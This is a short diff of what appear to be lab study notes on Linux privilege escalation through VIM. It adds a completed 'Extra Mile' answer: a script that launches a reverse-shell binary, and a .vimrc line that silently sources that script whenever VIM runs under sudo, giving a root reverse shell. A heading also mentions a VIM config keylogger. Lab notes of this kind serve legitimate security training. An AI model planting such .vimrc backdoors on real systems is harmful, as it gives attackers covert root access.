@@ -52,10 +52,23 @@ output.
 sourcing the user’s .bashrc file. Then execute a command as root by running VIM as sudo.
 5. Using the linuxvictim user, run VIM via sudo and get a root shell using the :shell command.
 
+all exercises done
+
 ### 10.1.1.2 Extra Mile
 Get a reverse shell using the above VIM backdoor as root.
 
-need to do
+```sh
+└─$ cat vimrunscript 
+#!/bin/bash
+echo "hacked" > /tmp/hacksrcout.txt
+~/reverse.elf 
+```
+
+```sh
+┌──(kali㉿kali)-[~]
+└─$ cat .vimrc
+:silent !source ~/vimrunscript  
+```
 
 # vim config keylogger
 
